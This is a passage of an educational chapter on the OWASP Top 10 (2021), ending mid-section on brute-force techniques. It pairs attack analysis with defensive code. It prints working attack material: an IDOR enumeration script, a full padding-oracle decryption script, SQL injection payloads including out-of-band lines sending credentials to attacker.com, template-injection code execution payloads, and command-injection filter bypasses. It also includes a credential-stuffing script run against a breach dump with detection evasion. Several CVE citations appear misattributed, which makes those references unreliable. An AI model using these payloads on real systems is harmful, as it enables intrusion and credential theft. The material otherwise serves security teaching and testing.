# OWASP Top 10 (2021) Deep Technical Analysis

## OWASP Top 10 Methodology

The OWASP Top 10 (2021) represents the consensus of security researchers, bug bounty hunters, and industry data from thousands of applications. The 2021 edition was compiled from contributor data covering over 500,000 applications, incorporating analysis from Common Weakness Enumeration (CWE) mappings and real-world incident data. Each category maps to specific CWEs that represent the underlying root causes.

This chapter provides deep technical analysis of each category, going beyond the OWASP descriptions to explore exploitation mechanics, real-world vulnerability patterns, and defense-in-depth strategies.

---

## A01:2021 – Broken Access Control

Broken Access Control moved from #5 in 2017 to #1 in 2021, reflecting the proliferation of APIs and microservices where authorization is inconsistently enforced. The category encompasses failures to enforce proper restrictions on authenticated users, allowing them to operate outside their intended permissions.

### Insecure Direct Object Reference (IDOR)

IDOR occurs when an application exposes internal object references (database IDs, file paths, keys) without verifying the requesting user's authorization for that specific object. This is the most common access control failure in modern APIs.

```http
GET /api/v1/users/42/profile HTTP/1.1
Host: api.target.com
Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoxOX0...

HTTP/1.1 200 OK
Content-Type: application/json

{
  "id": 42,
  "username": "admin_user",
  "email": "admin@target.com",
  "role": "admin",
  "api_key": "sk-live-4242424242424242",
  "two_factor_enabled": false
}
```

An attacker with user ID 19 simply changes the ID in the URL:

```http
GET /api/v1/users/19/profile HTTP/1.1
  → Returns own profile (expected)

GET /api/v1/users/42/profile HTTP/1.1
  → Returns admin's profile (IDOR: broken access control)

GET /api/v1/users/1/profile HTTP/1.1
  → Returns first user's profile (typically the superadmin)
```

Automated IDOR discovery uses predictable identifier patterns:

```python
import requests
import concurrent.futures

def test_idor(base_url, user_token, object_type, id_range):
    """Systematic IDOR testing across a range of object IDs."""
    session = requests.Session()
    session.headers.update({"Authorization": f"Bearer {user_token}"})
    results = []
    
    for obj_id in id_range:
        url = f"{base_url}/api/v1/{object_type}/{obj_id}"
        resp = session.get(url)
        if resp.status_code == 200:
            data = resp.json()
            # Check if the returned data belongs to a different user
            if data.get('user_id') != current_user_id:
                results.append({
                    'url': url,
                    'status': resp.status_code,
                    'data_exposed': bool(data),
                    'id': obj_id
                })
    return results

# Test sequential IDs, UUIDs with predictable patterns, base64-encoded IDs
with concurrent.futures.ThreadPoolExecutor(max_workers=20) as executor:
    futures = []
    for obj_type in ['users', 'orders', 'transactions', 'documents']:
        futures.append(executor.submit(
            test_idor, 
            "https://api.target.com", 
            "eyJ...",
            obj_type, 
            range(1, 10000)
        ))
```

**IDOR with encoded identifiers** — Many applications encode or obfuscate identifiers, but this is not encryption:

```python
# Base64-encoded IDs
import base64
user_id = base64.b64encode(b"42").decode()  # "NDI="

# MongoDB ObjectId — contains timestamp + machine + process + counter
# 507f1f77bcf86cd799439011 is predictable if creation time is known

# UUIDv4 — should be unpredictable, but some implementations use v1 (MAC-based)
# UUIDv1: 6ec1bd1c-4365-11e9-b8e7-4ccc6a7b2125 → timestamp + MAC address

# Hashids — reversible encoding, not security
import hashids
h = hashids.Hashids("salt", 6)
h.encode(42)  # "jKNqYq"
h.decode("jKNqYq")  # (42,)
```

### Privilege Escalation

**Vertical privilege escalation** involves accessing functionality reserved for higher-privilege users:

```http
# Regular user attempting admin endpoint
GET /api/v1/admin/users HTTP/1.1
Authorization: Bearer user_token

# If the server only checks client-side role (stored in JWT):
# JWT: {"user_id": 19, "role": "user"}
# Attacker modifies JWT (if weak signing): {"user_id": 19, "role": "admin"}
```

**Horizontal privilege escalation** involves accessing another user's data at the same privilege level:

```http
# User A accessing User B's resources
GET /api/v1/accounts/9876/transactions HTTP/1.1
Authorization: Bearer user_a_token
```

**Role manipulation** patterns vary by implementation:

```python
# Pattern 1: Role in JWT (client-side enforcement)
jwt_payload = {"user_id": 19, "role": "user"}
# Vulnerability: role claim trusted without server verification

# Pattern 2: Role in database, but endpoint lacks authorization check
@app.route('/api/admin/users')
@jwt_required()  # Checks authentication only
def list_users():
    # Missing: @admin_required decorator
    return jsonify(User.query.all())

# Pattern 3: Function-level access control
@app.route('/api/users/<int:user_id>/delete', methods=['DELETE'])
@jwt_required()
def delete_user(user_id):
    current_user = get_jwt_identity()
    # Vulnerability: no check that current_user has admin role
    User.query.filter_by(id=user_id).delete()
    db.session.commit()
```

### Forced Browsing

Forced browsing bypasses access controls by directly accessing endpoints that lack proper authorization checks:

```http
# Application shows admin panel link only to admins
# But the endpoint is not protected on the server side

GET /admin/dashboard HTTP/1.1  → 200 OK (admin panel rendered)
GET /admin/users/export HTTP/1.1  → 200 OK (CSV export of all users)
GET /admin/debug/sql-console HTTP/1.1  → 200 OK (SQL console exposed!)
```

Common forced browsing patterns:

```
/admin/
/administrator/
/admin/dashboard
/admin/config
/api/v1/admin/
/api/internal/
/swagger-ui/
/graphiql
/phpmyadmin/
/debug/
/metrics
/env
/actuator
/.env
/.git/
/server-status
```

**Parameter tampering** is a form of forced browsing that modifies request parameters to access unauthorized resources:

```http
# Original request
POST /api/v1/orders/1234/refund HTTP/1.1
{"amount": 50.00}

# Parameter tampering: adding admin parameters
POST /api/v1/orders/1234/refund HTTP/1.1
{"amount": 50.00, "bypass_approval": true, "immediate": true}

# Mass assignment vulnerability
PUT /api/v1/users/19 HTTP/1.1
Content-Type: application/json
{"name": "New Name"}
→ {"name": "New Name", "role": "user"}   # Original role

PUT /api/v1/users/19 HTTP/1.1
Content-Type: application/json
{"name": "New Name", "role": "admin"}     # Role escalation via mass assignment
```

### Access Control Defense

Implementing robust access control requires defense in depth:

```python
# Role-Based Access Control (RBAC) implementation
from functools import wraps
from flask import abort

def require_role(*roles):
    def decorator(f):
        @wraps(f)
        def decorated_function(*args, **kwargs):
            verify_jwt_in_request()
            current_user_role = get_jwt().get('role')
            if current_user_role not in roles:
                abort(403)
            return f(*args, **kwargs)
        return decorated_function
    return decorator

def require_ownership(resource_type):
    def decorator(f):
        @wraps(f)
        def decorated_function(*args, **kwargs):
            verify_jwt_in_request()
            current_user_id = get_jwt_identity()
            resource_id = kwargs.get('id')
            resource = getattr(models, resource_type).query.get(resource_id)
            if not resource:
                abort(404)
            if resource.owner_id != current_user_id:
                abort(403)
            return f(*args, **kwargs)
        return decorated_function
    return decorator

@app.route('/api/v1/users/<int:user_id>/profile')
@require_jwt
@require_ownership('User')  # Can only access own profile
def get_user_profile(user_id):
    return jsonify(User.query.get(user_id).to_dict())

@app.route('/api/v1/admin/users')
@require_jwt
@require_role('admin', 'superadmin')
def list_all_users():
    return jsonify([u.to_dict() for u in User.query.all()])
```

---

## A02:2021 – Cryptographic Failures

Formerly "Sensitive Data Exposure," renamed to emphasize root cause over symptom. Cryptographic failures encompass any failure to properly protect data through encryption, hashing, or key management.

### TLS Misconfiguration

TLS misconfiguration remains pervasive despite increased adoption of HTTPS:

```bash
# Testing TLS configuration with testssl.sh
testssl.sh --full --severity LOW target.example.com

# Common findings:
#   TLS 1.0 enabled (CVE-2011-3389, BEAST)
#   TLS 1.1 enabled (deprecated, RFC 8996)
#   RC4 cipher suites (CVE-2013-2566, CVE-2015-2808)
#   CBC mode cipher suites (Lucky13 attack)
#   No forward secrecy (static RSA key exchange)
#   Certificate uses SHA-1 (deprecated)
#   HSTS not configured
#   Vulnerable to Heartbleed (CVE-2014-0160)
```

**TLS downgrade attacks**: An active network attacker can downgrade TLS negotiation:

```python
# sslstrip-style downgrade: HTTPS → HTTP
# 1. Attacker performs ARP spoofing to MITM position
# 2. All HTTPS links in HTTP responses are rewritten to HTTP
# 3. User's browser makes plaintext HTTP requests
# 4. Attacker forwards to server over HTTPS
# 5. HSTS (HTTP Strict Transport Security) prevents this for HSTS-enabled domains

# Testing for missing HSTS:
# HTTP response must include:
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload

# Without HSTS, the first connection each session is vulnerable to sslstrip
```

**Certificate pinning**: Although Chrome removed HPKP (HTTP Public Key Pinning) in 2018, certificate pinning remains relevant for mobile apps and API clients:

```python
# Python certificate pinning with requests
import requests
import ssl
from requests.adapters import HTTPAdapter

class PinnedHTTPSAdapter(HTTPAdapter):
    def init_poolmanager(self, *args, **kwargs):
        # Pin specific certificate fingerprint
        kwargs['assert_fingerprint'] = 'sha256:2b63...ab1d='
        return super().init_poolmanager(*args, **kwargs)

session = requests.Session()
session.mount('https://api.target.com', PinnedHTTPSAdapter())
```

### Weak Hashing and Password Storage

```python
# VULNERABLE: MD5 password hashing
import hashlib
password_hash = hashlib.md5(password.encode()).hexdigest()
# Collision attacks: CVE-2004-2771 (practical MD5 collisions)
# Rainbow table attacks: precomputed MD5 hash databases

# VULNERABLE: SHA-1 password hashing  
password_hash = hashlib.sha1(password.encode()).hexdigest()
# SHA-1 collisions: SHAttered attack (2017)

# VULNERABLE: Unsalted hashing
# Same passwords produce identical hashes, enabling:
# 1. Rainbow table lookups
# 2. Cross-user pattern analysis
# 3. Password reuse detection across systems

# INSECURE: Salted but fast hashing
password_hash = hashlib.sha256((salt + password).encode()).hexdigest()
# Still vulnerable to GPU-based brute force: modern GPUs compute ~2 billion SHA-256/s

# SECURE: Adaptive hashing with bcrypt/scrypt/Argon2
import bcrypt
password_hash = bcrypt.hashpw(password.encode(), bcrypt.gensalt(rounds=14))
# bcrypt is intentionally slow (~100ms per hash), making brute force impractical
# Argon2id is the current recommended standard (winner of PHC 2015)

import argon2
ph = argon2.PasswordHasher(
    time_cost=3,        # Number of iterations
    memory_cost=65536,  # 64 MB memory usage
    parallelism=4,      # Number of parallel threads
    hash_len=32,        # Output hash length
    salt_len=16         # Salt length
)
password_hash = ph.hash(password)
```

### Padding Oracle Attacks

Padding oracle attacks exploit servers that leak information about CBC-mode padding validity through different error responses:

```python
# Vulnerable server behavior:
# Request: /decrypt?data=ENCRYPTED_PAYLOAD
# Correct padding + decryption → 200 OK (or valid decrypted data)
# Incorrect padding → 500 Internal Server Error (or "padding error")
# Correct padding, wrong data → 200 OK (or "invalid data")

# Attack: Decrypt any ciphertext without knowing the key
# CBC decryption: P[i] = D(C[i]) XOR C[i-1]
# By manipulating C[i-1] and observing padding validity, we can determine D(C[i]) byte-by-byte

import requests
import base64

def padding_oracle_attack(ciphertext, oracle_url):
    """Decrypt ciphertext using padding oracle."""
    block_size = 16  # AES block size
    blocks = [ciphertext[i:i+block_size] for i in range(0, len(ciphertext), block_size)]
    
    plaintext = b''
    
    for block_idx in range(1, len(blocks)):
        prev_block = bytearray(blocks[block_idx - 1])
        decrypted_block = bytearray(block_size)
        
        for byte_idx in range(block_size - 1, -1, -1):
            padding_value = block_size - byte_idx
            
            # Set already-known bytes to produce correct padding
            for k in range(byte_idx + 1, block_size):
                prev_block[k] = decrypted_block[k] ^ padding_value
            
            # Try all 256 values for current byte
            for guess in range(256):
                prev_block[byte_idx] = guess
                
                # Send modified ciphertext to oracle
                test_payload = bytes(prev_block) + blocks[block_idx]
                test_payload_b64 = base64.b64encode(test_payload).decode()
                
                response = requests.get(
                    f"{oracle_url}?data={test_payload_b64}",
                    allow_redirects=False
                )
                
                if response.status_code != 500:  # Valid padding
                    # D(C[i])[byte_idx] = guess XOR padding_value
                    decrypted_block[byte_idx] = guess ^ padding_value
                    break
        
        # P[i] = D(C[i]) XOR original C[i-1]
        for i in range(block_size):
            decrypted_block[i] ^= blocks[block_idx - 1][i]
        
        plaintext += bytes(decrypted_block)
    
    return plaintext

# This attack decrypts AES-CBC ciphertext in O(256 * n * block_size) oracle queries
# For a 64-byte ciphertext (4 blocks, 16 bytes each): ~16,384 requests
# Most vulnerabilities of this type: ASP.NET (CVE-2010-3332), Java (CVE-2014-3566)
```

Notable padding oracle CVEs:
- **CVE-2010-3332** (ASP.NET padding oracle): Revealed through encrypted ViewState and cookie values. Enabled full decryption and forgery of any encrypted data.
- **CVE-2014-3566** (SSLv3 POODLE): Not padding oracle per se, but exploited CBC padding in SSLv3.
- **CVE-2019-1653** (Cisco RV320 router): Padding oracle in session cookie decryption allowing authentication bypass.

### Sensitive Data Exposure Patterns

```python
# Error messages leaking sensitive information
@app.route('/api/users/<int:user_id>')
def get_user(user_id):
    user = User.query.get(user_id)
    if not user:
        abort(404, description=f"No user found with ID {user_id}")  # OK
    
    # VULNERABLE: Exposing internal fields
    return jsonify(user.to_dict())  # If to_dict() includes password_hash, ssn, etc.

# API responses leaking sensitive fields
{
  "id": 42,
  "username": "admin",
  "email": "admin@target.com",
  "password_hash": "$2b$12$LJ3m4ys3Lz8Q5...",   # Should never be in API response
  "ssn": "123-45-6789",                           # PII exposure
  "api_key": "sk_live_4242424242424242",          # Credential exposure
  "internal_id": 1042,                             # Internal reference exposure
  "ip_address": "10.0.0.5"                        # Internal network info
}
```

---

## A03:2021 – Injection

Injection moved from #1 (2017) to #3 (2021) not because it's less prevalent but because Broken Access Control increased in incidence. Injection remains the most technically dangerous vulnerability category, enabling direct data exfiltration and remote code execution.

### SQL Injection

**Union-based SQLi** — Extracting data through UNION SELECT:

```http
GET /api/v1/products?category=Gifts'+UNION+SELECT+username,password+FROM+users-- HTTP/1.1

-- Resulting query:
SELECT name, description FROM products WHERE category = 'Gifts' 
UNION SELECT username, password FROM users--
```

```sql
-- Column count determination:
' ORDER BY 1--    → 200 OK (1 column)
' ORDER BY 2--    → 200 OK (2 columns)
' ORDER BY 3--    → 500 Error (only 2 columns in original query)

-- Database fingerprinting:
' UNION SELECT @@version, NULL--                    → MySQL/MariaDB
' UNION SELECT version(), NULL--                    → PostgreSQL
' UNION SELECT sqlite_version(), NULL--             → SQLite
' UNION SELECT banner, NULL FROM v$version--        → Oracle

-- Data extraction (MySQL):
' UNION SELECT table_name, NULL FROM information_schema.tables WHERE table_schema=database()--
' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users'--
' UNION SELECT username, password FROM users--
```

**Blind boolean SQLi** — Inferring data through conditional responses:

```python
# Boolean-based blind SQLi
import requests

def blind_sqli_extract_char(url, position, char_value):
    payload = f"' AND (SELECT SUBSTRING(username,{position},1) FROM users LIMIT 1)='{char_value}'--"
    response = requests.get(url + payload)
    # True condition: page returns "Welcome, admin!"
    # False condition: page returns "No results found"
    return "Welcome" in response.text

def extract_string(url, position):
    for char in "abcdefghijklmnopqrstuvwxyz0123456789":
        if blind_sqli_extract_char(url, position, char):
            return char
    return None

# Extracted character by character — very slow but effective
username = ""
for i in range(1, 20):
    char = extract_string(url, i)
    if char:
        username += char
    else:
        break
# username = "admin"
```

**Time-based blind SQLi** — Inferring data through response timing:

```sql
-- MySQL time-based blind injection
' AND IF(SUBSTRING(username,1,1)='a', SLEEP(5), 0)-- -

-- PostgreSQL
' AND (SELECT CASE WHEN SUBSTRING(username,1,1)='a' THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users LIMIT 1)-- -

-- MSSQL
' IF(SUBSTRING(username,1,1)='a') WAITFOR DELAY '0:0:5'-- -

-- Oracle
' AND (SELECT CASE WHEN SUBSTRING(username,1,1)='a' THEN DBMS_PIPE.RECEIVE_MESSAGE('a',5) ELSE 1 END FROM users WHERE ROWNUM=1)='1'-- -
```

**Out-of-band (OOB) SQLi** — Exfiltrating data through DNS or HTTP:

```sql
-- MySQL OOB via LOAD_FILE and DNS
' UNION SELECT LOAD_FILE(CONCAT('\\\\\\\\', username, '.', password, '.attacker.com\\\\a')), NULL FROM users--

-- MSSQL OOB via xp_dirtree
' UNION SELECT xp_dirtree(CONCAT('\\\\\\\\', username, '.', password, '.attacker.com\\\\a')), NULL--

-- Oracle OOB via UTL_HTTP
' UNION SELECT UTL_HTTP.REQUEST(CONCAT('http://attacker.com/?data=', username||'~'||password)), NULL FROM users--
```

**Second-order SQLi** — Injection payload is stored and later executed in a different context:

```python
# Registration endpoint stores payload
username = "admin' --"
# Stored as: INSERT INTO users (username, password) VALUES ('admin' --', 'hashed_pw')

# Password reset endpoint uses stored username
query = f"UPDATE users SET password = '{new_hash}' WHERE username = '{username}'"
# Executed as: UPDATE users SET password = 'new_hash' WHERE username = 'admin' --'
# This changes the admin account's password!
```

### NoSQL Injection

NoSQL databases (MongoDB, CouchDB, Redis) use different query syntax, but injection vulnerabilities persist:

```python
# MongoDB injection via query string parameter pollution
# Vulnerable: passing user input directly to MongoDB query
@app.route('/api/users')
def find_user():
    query = request.args.to_dict()  # Directly converts all params to query
    return list(db.users.find(query))

# Attack: ?username[$ne]=admin&password[$ne]=password
# Constructs: db.users.find({"username": {"$ne": "admin"}, "password": {"$ne": "password"}})
# Returns all users except the one matching both conditions

# Attack: ?username[$regex]=.*&password[$regex]=.*
# Constructs: db.users.find({"username": {"$regex": ".*"}, "password": {"$regex": ".*"}})

# Extracting data character by character:
# ?username=admin&password[$regex]=^a
# ?username=admin&password[$regex]=^ad
# ?username=admin&password[$regex]=^adm
# ?username=admin&password[$regex]=^admi
# ?username=admin&password[$regex]=^admin  → Match! Login successful

# JavaScript injection in MongoDB $where:
# ?search=$where:this.username.match(/.*/)
# ?search=$where:this.password[0]=='a'

# CouchDB injection:
# ?key="username"&startkey="admin"&endkey="admin\\u9999"
# View function injection: function(doc) { emit(doc.username, doc.password); }
```

### LDAP Injection

LDAP injection targets directory services using LDAP queries:

```http
# Vulnerable login query:
(&(uid=USERNAME)(userPassword=PASSWORD))

# Bypass with: USERNAME = *)(|(uid=*
# Resulting query:
(&(uid=*)(|(uid=*)(userPassword=PASSWORD)))

# Authentication bypass variants:
USERNAME = admin)(&))
USERNAME = admin)(|(password=*
USERNAME = *)(objectClass=*
```

### OS Command Injection

Command injection occurs when user input is passed to system shell commands:

```python
# VULNERABLE: Python subprocess with shell=True
import subprocess

@app.route('/api/ping')
def ping():
    host = request.args.get('host')
    result = subprocess.run(f'ping -c 3 {host}', shell=True, capture_output=True)
    return result.stdout.decode()

# Attack: /api/ping?host=127.0.0.1;id
# Executes: ping -c 3 127.0.0.1;id
# Output: PING 127.0.0.1 ... uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Command injection payload variants:

```bash
# Command separators
127.0.0.1;id                    # Semicolon: sequential execution
127.0.0.1|id                    # Pipe: output of left as input to right
127.0.0.1||id                   # OR: execute right if left fails
127.0.0.1&&id                   # AND: execute right if left succeeds
127.0.0.1&id                    # Background: run left, start right
127.0.0.1%0aid                  # Newline: sequence execution

# Command substitution
$(id)                           # Command substitution
`id`                            # Backtick substitution

# Bypassing filters
i''d                            # String splitting (bash)
i\d                             # Backslash escaping
$HOME                           # Environment variable expansion
${PATH:0:1}                     # Substring extraction → /
${IFS}                          # Internal Field Separator (default: space/tab/newline)
```

### Server-Side Template Injection (SSTI)

Template injection enables code execution through template engines:

```python
# Jinja2 (Python/Flask/Django)
{{ config }}                                    # Access Flask config
{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}
{{ ''.__class__.__mro__[1].__subclasses__() }}  # Find exploitable classes
{{ lipsum.__globals__['os'].popen('id').read() }}
{{ cycler.__init__.__globals__.os.popen('id').read() }}
{{ request.__class__.__mro__[1].__subclasses__()[XXX]('/etc/passwd').read() }}

# Twig (PHP)
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
{{['id']|filter('system')}}
{{['cat /etc/passwd']|filter('exec')}}

# Freemarker (Java)
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
${"freemarker.template.utility.Execute"?new()("id")}

# ERB (Ruby)
<%= system('id') %>
<%= `id` %>
<%= eval('puts `id`') %>

# Mako (Python)
${__import__('os').popen('id').read()}
<% import os %>${os.popen('id').read()}

# Expression Language (Java EE)
${T(java.lang.Runtime).getRuntime().exec('id')}
${request.getClass().forName('java.lang.Runtime').getRuntime().exec('id')}
```

Template injection detection methodology (inspired by James Kettle's research):

```
${7*7}        → 49       (Template expression, multiple engines)
{{7*7}}       → 49       (Jinja2, Twig, Vue, Angular)
#{7*7}        → 49       (Thymeleaf, Freemarker interpolation)
${7*7}        → 49       (Mako, Velocity, Jelly)
{{7*'7'}}     → 7777777  (Jinja2 string multiplication)
{{7*'7'}}     → 49       (Twig math)
{{config}}    → {...}     (Flask config object)
```

---

## A04:2021 – Insecure Design

Insecure Design is new to the 2021 Top 10, focusing on design and architectural flaws rather than implementation bugs. It represents vulnerabilities rooted in missing or ineffective security controls at the design phase.

### Threat Modeling Failures

Insecure design manifests when threat modeling is absent or inadequate:

```
Example: Password Reset Design Flaw

Naive Design:
1. User enters email
2. System generates 6-digit PIN
3. System emails PIN to user
4. User enters PIN on verification page
5. If PIN matches, user sets new password

Threat Model Analysis:
- 6-digit PIN: 1,000,000 possible values
- Rate limit: 5 attempts per minute (configurable per attacker)
- Attack: Send reset → brute force PIN → rate limit blocks
- But: rate limit per token, not per account → create new tokens → reset rate limit
- Attack variant: request 12 reset PINs → brute force each with 83 attempts → P(6-digit PIN cracked) ≈ 1

Secure Design:
1. User enters email
2. System generates cryptographically random token (128+ bits)
3. System emails link with token
4. Token has 15-minute expiration
5. Rate limit per account: 3 reset requests per 24 hours
6. Rate limit per token: 5 attempts, then token invalidated
7. Reset token is single-use
8. Success/failure responses are identical (no user enumeration)
```

Common insecure design patterns:

1. **Missing authorization in design**: API endpoints defined without specifying required roles.
2. **Trust boundaries not defined**: Internal services trust all requests from the internal network without authentication.
3. **Insufficient business logic controls**: No audit trail for financial transactions, allowing reversal fraud.
4. **Missing abuse case scenarios**: Password reset designed for happy path but not for brute force or phishing.
5. **Over-reliance on client-side controls**: Authorization enforced only in frontend JavaScript, not in API.

### Secure Design Patterns

```python
# Design-level defense: Defense in depth for financial operations

class TransferService:
    """Secure transfer design with multiple control layers."""
    
    TRANSFER_LIMITS = {
        'basic': Decimal('1000'),
        'verified': Decimal('10000'),
        'premium': Decimal('100000'),
    }
    
    def initiate_transfer(self, from_account, to_account, amount, user):
        # Control 1: Authentication verified by JWT middleware
        # Control 2: Authorization: user must own from_account
        if from_account.owner_id != user.id:
            raise AuthorizationError("Not your account")
        
        # Control 3: Transfer limit based on account tier
        limit = self.TRANSFER_LIMITS[from_account.tier]
        if amount > limit:
            raise BusinessRuleError(f"Transfer limit exceeded: {limit}")
        
        # Control 4: Daily cumulative transfer limit
        daily_total = self.get_daily_total(from_account)
        if daily_total + amount > limit * 10:
            raise BusinessRuleError("Daily transfer limit exceeded")
        
        # Control 5: Two-person integrity for large transfers
        if amount > Decimal('50000'):
            return self.create_pending_transfer(from_account, to_account, amount)
            # Requires separate approval from a different authorized user
        
        # Control 6: 2FA for transfers above threshold
        if amount > Decimal('5000'):
            require_2fa(user)
        
        # Control 7: Audit logging (immutable, append-only)
        audit_log(
            action='transfer_initiated',
            user_id=user.id,
            from_account=from_account.id,
            to_account=to_account.id,
            amount=amount,
            ip_address=request.remote_addr,
            timestamp=datetime.utcnow()
        )
        
        return self.execute_transfer(from_account, to_account, amount)
```

---

## A05:2021 – Security Misconfiguration

Security misconfiguration encompasses any insecure configuration of application stack components.

### Common Misconfiguration Patterns

**Default credentials** remain remarkably prevalent:

```bash
# Common default credential lists targeted by scanners
admin:admin           # Tomcat, Jenkins, various routers
admin:password        # Multiple devices
admin:12345           # DVR systems, IP cameras
root:root             # Various Linux services
sa:blank              # Microsoft SQL Server
redis: (no password)  # Redis default
postgres:postgres     # PostgreSQL default
mongod:mongod          # MongoDB default
elastic:changeme      # Elasticsearch (X-Pack)
guest:guest           # RabbitMQ default
```

**Unnecessary features enabled**:

```http
# Debug endpoints exposed in production
GET /debug/pprof HTTP/1.1          → Go pprof profiling data
GET /debug/vars HTTP/1.1           → Go expvar metrics
GET /actuator/env HTTP/1.1         → Spring Boot environment variables
GET /actuator/heapdump HTTP/1.1    → Spring Boot heap dump (contains secrets)
GET /env HTTP/1.1                  → Rails environment info
GET /phpinfo.php HTTP/1.1         → PHP configuration dump
GET /server-info HTTP/1.1          → Apache server info
GET /awstats/ HTTP/1.1            → AWStats interface
GET /swagger-ui.html HTTP/1.1     → API documentation
GET /graphql?introspection=true HTTP/1.1 → GraphQL schema dump
GET /api-docs HTTP/1.1            → OpenAPI/Swagger spec
GET /.git/config HTTP/1.1         → Git repository configuration
GET /wp-config.php~ HTTP/1.1     → WordPress config backup
```

**Verbose error messages**:

```python
# Django DEBUG=True in production
#settings.py
DEBUG = True  # VULNERABLE: Leaks stack traces, settings, local variables

# Result: 500 error page shows full stack trace, local variables,
# settings (including SECRET_KEY, database credentials), and URL patterns

# Flask with debug mode
app.run(debug=True)  # VULNERABLE: Enables Werkzeug debugger
# The debugger provides an interactive Python console accessible via PIN
# PIN can be computed from: username, module name, machine ID, moddir

# Express.js verbose error handling
app.use(function(err, req, res, next) {
    res.status(500).json({
        error: err.message,          // Exposes error details
        stack: err.stack,            // Exposes stack trace with file paths
        query: req.query,            // Exposes query parameters
    });
});
```

### HTTP Security Headers Misconfiguration

```http
# Essential security headers and proper configuration

# 1. Content-Security-Policy (most complex header)
Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-{random}'; style-src 'self' 'unsafe-inline'; img-src 'self' data: https:; object-src 'none'; frame-ancestors 'none'; base-uri 'self'; form-action 'self'

# 2. Strict-Transport-Security (HSTS)
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload

# 3. X-Content-Type-Options
X-Content-Type-Options: nosniff

# 4. X-Frame-Options (superseded by CSP frame-ancestors, but still recommended)
X-Frame-Options: DENY

# 5. Referrer-Policy
Referrer-Policy: strict-origin-when-cross-origin

# 6. Permissions-Policy
Permissions-Policy: camera=(), microphone=(), geolocation=(), payment=()

# 7. Cross-Origin headers
Cross-Origin-Opener-Policy: same-origin
Cross-Origin-Resource-Policy: same-origin
Cross-Origin-Embedder-Policy: require-corp
```

---

## A06:2021 – Vulnerable and Outdated Components

### Dependency Management and Software Bill of Materials

```bash
# Checking for known vulnerabilities in dependencies

# Node.js / npm
npm audit                        # Check package.json vulnerabilities
npm ls lodash                    # Check specific dependency version
npx better-npm-audit             # Enhanced npm audit
# High-profile npm vulnerabilities:
#   lodash < 4.17.12: prototype pollution (CVE-2020-8207)
#   event-stream 3.3.6: malicious code injection (bitcoin wallet theft)
#   left-pad: trivial package that broke the internet (2016)

# Python / pip
pip audit                        # Check requirements.txt vulnerabilities
safety check -r requirements.txt # Alternative vulnerability scanner
# High-profile Python vulnerabilities:
#   Pillow < 8.1.1: buffer overflow in PSD image parsing (CVE-2021-27944)
#   urllib3 < 1.26: unverified HTTPS connections (CVE-2020-26137)

# Java / Maven
mvn org.owasp:dependency-check:check  # OWASP Dependency-Check
# High-profile Java vulnerabilities:
#   log4j 2.0-beta9 - 2.14.1: Log4Shell (CVE-2021-44228)
#   jackson-databind < 2.10: deserialization RCE (multiple CVEs)
#   Spring Framework < 5.3.18: Spring4Shell (CVE-2022-22965)

# Go modules
go vet ./...                     # Built-in Go analysis
nancy sleuth                     # Sonatype vulnerability scanner for Go
```

### Supply Chain Attack Vectors

```bash
# Typosquatting: packages with names similar to popular packages
#   → "lodash" vs "l0dash", "express" vs "expres"

# Dependency confusion: internal package name leaked, published on public registry
#   → python -m pip install requests (public PyPI)
#   → Company has internal "requests" package
#   → pip installs public "requests" instead of internal one
#   → Attack: publish malicious package with same name as internal package

# Dependency confusion attack flow:
# 1. Attacker identifies internal package names from error messages, JS bundles
# 2. Attacker publishes package with same name to PyPI/npmjs.com
# 3. Build system resolves from public registry before private registry
# 4. Malicious package executes preinstall script

# Package.json showing internal dependency:
# "dependencies": {
#   "company-internal-auth": "1.2.3",  // Internal package name exposed
#   "express": "^4.17.1"
# }

# Mitigation: Use scoped registries and .npmrc
# @company:registry=https://npm.company.com/
# //npm.company.com/:_authToken=${NPM_TOKEN}
```

---

## A07:2021 – Identification and Authentication Failures

### Credential Stuffing

Credential stuffing leverages credential dumps from one breach to attempt authentication on other services:

```python
# Credential stuffing attack pattern
import requests
from concurrent.futures import ThreadPoolExecutor

def credential_stuff(target_url, email, password):
    session = requests.Session()
    # Rotate User-Agent to avoid detection
    session.headers.update({
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) ...',
    })
    
    # Get CSRF token if required
    resp = session.get(f"{target_url}/login")
    csrf_token = extract_csrf_token(resp.text)
    
    # Attempt login
    resp = session.post(f"{target_url}/api/auth/login", data={
        'email': email,
        'password': password,
        'csrf_token': csrf_token,
    })
    
    if resp.status_code == 200 and 'Invalid credentials' not in resp.text:
        return {'email': email, 'password': password, 'cookies': session.cookies}
    return None

# Against a credential dump (email:password pairs from a breach)
with open('breach_dump.txt') as f:
    credentials = [line.strip().split(':') for line in f]

with ThreadPoolExecutor(max_workers=50) as executor:
    futures = [
        executor.submit(credential_stuff, 'https://target.com', email, pwd)
        for email, pwd in credentials
    ]
    successful = [f.result() for f in futures if f.result()]
```

### Session Fixation

Session fixation forces a known session ID onto a victim:

```http
# Attack flow:
# 1. Attacker obtains a valid session ID
GET /login HTTP/1.1
Set-Cookie: session=FIXED_SESSION_ID; Path=/

# 2. Attacker crafts URL with session ID
https://target.com/login?session=FIXED_SESSION_ID
# Or: https://target.com/page#session=FIXED_SESSION_ID  (if cookie is read from URL)

# 3. Victim clicks link and logs in
POST /login HTTP/1.1
Cookie: session=FIXED_SESSION_ID
username=victim&password=victim_password

# 4. Server does NOT issue a new session ID after login
# Attacker now has an authenticated session: FIXED_SESSION_ID

# Defense: Regenerate session ID after authentication
@app.route('/login', methods=['POST'])
def login():
    user = authenticate(request.form['username'], request.form['password'])
    if user:
        session.regenerate()  # Critical: new session ID after login
        session['user_id'] = user.id
```

### Brute Force Attacks

```python
# Password brute force with rate limit bypass techniques

# Technique 1: IP rotation via proxy chains
proxies = ["http://proxy1:8080", "http://proxy2:8080", "http://proxy3:8080"]
for attempt, password in enumerate(password_list):
    proxy = proxies[attempt % len(proxies)]
    resp = requests.post(login_url, data={'username': target, 'password': password}, 
                         proxies={'http': proxy})

# Technique 2: Account lockout bypass
